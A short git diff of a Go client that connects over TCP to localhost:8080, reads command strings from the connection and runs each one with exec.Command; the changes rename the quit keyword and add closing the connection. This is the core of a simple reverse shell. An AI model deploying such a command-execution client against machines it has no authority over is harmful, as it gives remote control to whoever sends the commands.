@@ -18,8 +18,7 @@ type P struct {
 */
 
 func main() {
-	// Start client
-	fmt.Println("Start client")
+
 	conn, err := net.Dial("tcp", "localhost:8080")
 
 	if err != nil {
@@ -33,11 +32,10 @@ func main() {
 		cmd = strings.TrimSuffix(cmd, "\n")
 		cmd = strings.TrimSuffix(cmd, "\n")
 
-		if (cmd == "exit") {
+		if strings.Compare(cmd, "close") == 0 {
 			break
 		}
 
-		fmt.Println(cmd)
 		out, err := exec.Command(cmd).Output()
 		
 		if err != nil {
@@ -53,4 +51,5 @@ func main() {
 		}
 		*/
 	}
+	conn.Close()
 }
